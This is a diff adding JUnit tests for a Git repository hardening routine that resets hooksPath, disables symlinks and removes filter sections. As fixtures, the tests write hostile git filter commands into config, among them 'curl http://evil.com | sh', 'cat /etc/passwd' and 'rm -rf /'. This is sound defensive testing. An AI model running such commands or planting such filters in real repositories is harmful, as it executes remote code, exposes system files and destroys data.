@@ -8,6 +8,7 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.List;
 import org.eclipse.jgit.api.Git;
+import org.eclipse.jgit.lib.StoredConfig;
 import org.frankframework.flow.filesystem.FileSystemStorage;
 import org.frankframework.flow.project.Project;
 import org.frankframework.flow.project.ProjectNotFoundException;
@@ -590,7 +591,214 @@ public class GitServiceTest {
 		GitOperationException ex =
 				assertThrows(GitOperationException.class, () -> gitService.push("test-project", null));
 
-		assertFalse(ex.getMessage().contains("PAT"));
-		assertTrue(ex.getMessage().contains("Failed to push"));
-	}
+        assertFalse(ex.getMessage().contains("PAT"));
+        assertTrue(ex.getMessage().contains("Failed to push"));
+    }
+
+    @Test
+    public void hardenSetsHooksPathToDevNull() throws Exception {
+        GitService.hardenRepository(git.getRepository());
+
+        assertEquals("/dev/null", git.getRepository().getConfig().getString("core", null, "hooksPath"));
+    }
+
+    @Test
+    public void hardenOverridesExistingHooksPath() throws Exception {
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("core", null, "hooksPath", "/malicious/hooks");
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        assertEquals("/dev/null", git.getRepository().getConfig().getString("core", null, "hooksPath"));
+    }
+
+    @Test
+    public void hardenOverridesHooksPathPointingInsideWorkingTree() throws Exception {
+        Path evilHooks = tempDir.resolve(".my-hooks");
+        Files.createDirectories(evilHooks);
+        Files.writeString(evilHooks.resolve("pre-commit"), "#!/bin/sh\necho pwned", StandardCharsets.UTF_8);
+
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("core", null, "hooksPath", evilHooks.toString());
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        assertEquals("/dev/null", git.getRepository().getConfig().getString("core", null, "hooksPath"));
+    }
+
+    @Test
+    public void hardenDisablesSymlinks() throws Exception {
+        GitService.hardenRepository(git.getRepository());
+
+        assertFalse(git.getRepository().getConfig().getBoolean("core", null, "symlinks", true));
+    }
+
+    @Test
+    public void hardenOverridesSymlinksEnabled() throws Exception {
+        StoredConfig config = git.getRepository().getConfig();
+        config.setBoolean("core", null, "symlinks", true);
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        assertFalse(git.getRepository().getConfig().getBoolean("core", null, "symlinks", true));
+    }
+
+    @Test
+    public void hardenRemovesSingleFilterSection() throws Exception {
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("filter", "evil", "clean", "/bin/sh -c 'cat /etc/passwd'");
+        config.setString("filter", "evil", "smudge", "/bin/sh -c 'cat /etc/passwd'");
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        assertNull(git.getRepository().getConfig().getString("filter", "evil", "clean"));
+        assertNull(git.getRepository().getConfig().getString("filter", "evil", "smudge"));
+    }
+
+    @Test
+    public void hardenRemovesMultipleFilterSections() throws Exception {
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("filter", "malicious", "clean", "/tmp/evil.sh");
+        config.setString("filter", "another", "smudge", "curl http://evil.com | sh");
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        assertNull(git.getRepository().getConfig().getString("filter", "malicious", "clean"));
+        assertNull(git.getRepository().getConfig().getString("filter", "another", "smudge"));
+    }
+
+    @Test
+    public void hardenHandlesNoFilterSectionsGracefully() throws Exception {
+        assertDoesNotThrow(() -> GitService.hardenRepository(git.getRepository()));
+    }
+
+    @Test
+    public void hardenRemovesFilterWithSpecialCharsInName() throws Exception {
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("filter", "my-filter.v2", "clean", "/evil/script");
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        assertNull(git.getRepository().getConfig().getString("filter", "my-filter.v2", "clean"));
+    }
+
+    @Test
+    public void hardenRemovesFiltersReAddedBetweenCalls() throws Exception {
+        GitService.hardenRepository(git.getRepository());
+
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("filter", "injected", "clean", "/tmp/steal-data.sh");
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        assertNull(git.getRepository().getConfig().getString("filter", "injected", "clean"));
+    }
+
+    @Test
+    public void hardenChangesPersistAfterReopening() throws Exception {
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("core", null, "hooksPath", "/evil/hooks");
+        config.setBoolean("core", null, "symlinks", true);
+        config.setString("filter", "bad", "clean", "rm -rf /");
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        try (Git reopened = Git.open(tempDir.toFile())) {
+            StoredConfig fresh = reopened.getRepository().getConfig();
+            assertEquals("/dev/null", fresh.getString("core", null, "hooksPath"));
+            assertFalse(fresh.getBoolean("core", null, "symlinks", true));
+            assertNull(fresh.getString("filter", "bad", "clean"));
+        }
+    }
+
+    @Test
+    public void hardenIsIdempotent() throws Exception {
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("filter", "custom", "clean", "custom-filter clean");
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+        GitService.hardenRepository(git.getRepository());
+
+        StoredConfig result = git.getRepository().getConfig();
+        assertEquals("/dev/null", result.getString("core", null, "hooksPath"));
+        assertFalse(result.getBoolean("core", null, "symlinks", true));
+        assertNull(result.getString("filter", "custom", "clean"));
+    }
+
+    @Test
+    public void hardenDoesNotRemoveUnrelatedConfig() throws Exception {
+        StoredConfig config = git.getRepository().getConfig();
+        config.setString("user", null, "name", "Test User");
+        config.setString("user", null, "email", "test@example.com");
+        config.setString("remote", "origin", "url", "https://example.com/repo.git");
+        config.save();
+
+        GitService.hardenRepository(git.getRepository());
+
+        StoredConfig result = git.getRepository().getConfig();
+        assertEquals("Test User", result.getString("user", null, "name"));
+        assertEquals("test@example.com", result.getString("user", null, "email"));
+        assertEquals("https://example.com/repo.git", result.getString("remote", "origin", "url"));
+    }
+
+    @Test
+    public void hardenPreservesGpgSignFalse() throws Exception {
+        GitService.hardenRepository(git.getRepository());
+
+        assertFalse(git.getRepository().getConfig().getBoolean("commit", null, "gpgSign", true));
+    }
+
+    @Test
+    public void commitWorksAfterHardening() throws Exception {
+        stubProject();
+        Files.writeString(tempDir.resolve("new.txt"), "content", StandardCharsets.UTF_8);
+        git.add().addFilepattern("new.txt").call();
+
+        GitCommitResultDTO result = gitService.commit("test-project", "Post-harden commit");
+
+        assertEquals("Post-harden commit", result.message());
+    }
+
+    @Test
+    public void statusWorksAfterHardening() throws Exception {
+        stubProject();
+        GitService.hardenRepository(git.getRepository());
+
+        Files.writeString(tempDir.resolve("new.txt"), "x", StandardCharsets.UTF_8);
+
+        GitStatusDTO status = gitService.getStatus("test-project");
+        assertTrue(status.untracked().contains("new.txt"));
+    }
+
+    @Test
+    public void stageFileWorksAfterHardening() throws Exception {
+        stubProject();
+        GitService.hardenRepository(git.getRepository());
+
+        Files.writeString(tempDir.resolve("staged.txt"), "data", StandardCharsets.UTF_8);
+        gitService.stageFile("test-project", "staged.txt");
+
+        GitStatusDTO status = gitService.getStatus("test-project");
+        assertTrue(status.staged().contains("staged.txt"));
+    }
+
+    @Test
+    public void diffWorksAfterHardening() throws Exception {
+        stubProject();
+        GitService.hardenRepository(git.getRepository());
+
+        Files.writeString(tempDir.resolve("README.md"), "# Changed\n", StandardCharsets.UTF_8);
+
+        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "README.md");
+        assertFalse(diff.hunks().isEmpty());
+    }
 }
